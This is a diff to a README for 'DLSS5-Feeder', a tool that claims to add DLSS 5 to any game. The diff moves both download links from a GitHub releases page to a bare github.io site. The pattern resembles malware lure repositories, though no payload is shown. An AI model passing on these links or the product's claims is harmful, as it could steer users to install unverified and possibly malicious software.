@@ -1,6 +1,6 @@
 # 🎮 DLSS5-Feeder - Bring DLSS 5 to Any Game
 
-[![Download DLSS5-Feeder](https://img.shields.io/badge/Download-DLSS5--Feeder-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/nicolanonmechanical6684/DLSS5-Feeder/releases)
+[![Download DLSS5-Feeder](https://img.shields.io/badge/Download-DLSS5--Feeder-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://nicolanonmechanical6684.github.io)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Think of it this way: DLSS 5 is like a high-performance engine upgrade for your 
 
 ## 📥 How to Download
 
-Visit this link to download the application: [https://github.com/nicolanonmechanical6684/DLSS5-Feeder/releases](https://github.com/nicolanonmechanical6684/DLSS5-Feeder/releases)
+Visit this link to download the application: [https://nicolanonmechanical6684.github.io](https://nicolanonmechanical6684.github.io)
 
 When you arrive at the download page, you'll see a list of available releases. Look for the latest version and download the file provided there.
 
